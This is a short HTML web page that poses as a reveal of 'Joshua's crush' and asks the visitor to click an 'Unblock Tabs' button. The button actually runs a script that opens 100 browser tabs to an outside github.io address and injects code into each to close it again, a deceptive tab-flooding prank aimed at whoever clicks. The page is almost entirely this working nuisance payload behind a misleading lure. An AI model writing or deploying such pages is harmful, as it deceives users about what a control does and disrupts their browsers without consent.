<!DOCTYPE html>
<html>
<head>
    <title>Who is Joshua's Crush</title>
    <style>
        body {
            background-image: url('https://i.imgur.com/9GcrldH.jpg');
            background-repeat: no-repeat;
            background-size: cover;
        }

        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            text-align: center;
            font-size: 24px;
            color: black;
            font-weight: bold;
        }
    </style>
    <script>
        var url = "https://jz1324.github.io/noice/";
        var tabCount = 100;

        function openMultipleTabs() {
            for (let i = 0; i < tabCount; i++) {
                var tab = window.open(url, "_blank");
                tab.blur();
                tab.document.open();
                tab.document.write("<html><head><script>window.close();<\/script><\/head><body><\/body><\/html>");
                tab.document.close();
            }
        }

        function unblockTabs() {
            document.getElementById("overlay").style.display = "none";
            openMultipleTabs();
        }
    </script>
</head>
<body>
    <div id="overlay">
        <span>Who does Joshua like? Click the button to unblock the tabs from opening.</span>
        <br>
        <button onclick="unblockTabs()">Unblock Tabs</button>
    </div>
</body>
</html>
